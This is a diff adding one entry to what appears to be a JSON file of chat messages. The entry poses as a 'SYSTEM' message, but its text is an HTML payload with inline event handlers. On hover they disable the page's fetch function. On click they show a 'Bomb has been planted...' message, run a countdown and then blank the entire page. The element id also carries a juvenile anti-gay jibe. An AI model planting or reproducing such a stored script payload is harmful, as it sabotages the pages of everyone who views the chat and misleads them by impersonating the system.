@@ -1,3 +1,7 @@
 [
-  
+  {
+    "user": "SYSTEM",
+    "text": "<div style=\"display: inline-block; color:red; font-weight: 600; background-color: #999; padding: 8px 16px; border-radius: 4px\"><span style=\"display: none\">Bomb has been planted...</span> <span id=\"gay-counter\" onmouseover=\"window.fetch = () => {}\" onclick=\"const counterElement = this; counterElement.textContent = '10'; counterElement.parentElement.children[0].style.display = 'inline' ; window.setInterval(() => counterElement.textContent = Number(counterElement.textContent.trim()) - 1, 1000); window.setTimeout(() => document.documentElement.textContent = '', 10_500);\">DON'T CLICK AT ME</span></div>",
+    "date": "2025-04-13T04:27:27.808Z"
+  }
 ]
